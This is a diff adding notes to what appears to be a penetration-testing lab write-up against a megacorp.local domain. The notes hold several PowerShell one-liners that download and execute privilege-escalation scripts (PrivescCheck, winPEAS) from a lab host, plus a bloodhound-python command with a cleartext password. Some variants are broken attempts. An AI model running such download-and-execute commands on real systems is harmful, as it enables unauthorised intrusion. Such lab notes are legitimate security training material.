@@ -36,3 +36,26 @@ bloodhound-python -d megacorp.local -u tushikikatomo -p 'finance1' -ns 10.10.10.
 
 
 
+Let's get back to script and see what we can do there
+```
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
+```
+
+```
+Invoke-WebRequest -Uri http://10.10.16.6/Auto/winPEASx64.exe -OutFile winpeas.exe
+```
+
+```
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEASx64.exe'); Invoke-winPEASx64 -Extended
+```
+
+```
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEASx64.exe') | powershell -noprofile -
+```
+
+
+```
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1')
+```
+
+PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1
